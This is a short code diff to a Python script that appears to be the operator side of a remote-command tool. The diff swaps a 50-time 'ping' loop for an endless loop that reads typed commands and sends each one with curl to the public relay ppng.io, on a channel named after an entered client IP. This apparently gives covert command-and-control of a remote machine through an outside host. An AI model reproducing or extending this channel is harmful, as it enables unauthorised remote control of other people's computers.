@@ -6,8 +6,10 @@ clients_ip = input("CLIENTS IP: ") ## client to connects ip address (public)
 class Infinite:
 
     def Create():
-        for i in range(50):
-            subprocess.getoutput(f"echo ping | curl -T - https://ppng.io/{clients_ip}-infinite")
+        while True:
+            cmd = input("COMMAND: ")
+            subprocess.getoutput(f"echo {cmd} | curl -T - https://ppng.io/{clients_ip}-infinite")
+
 
 
 if __name__ == "__main__":
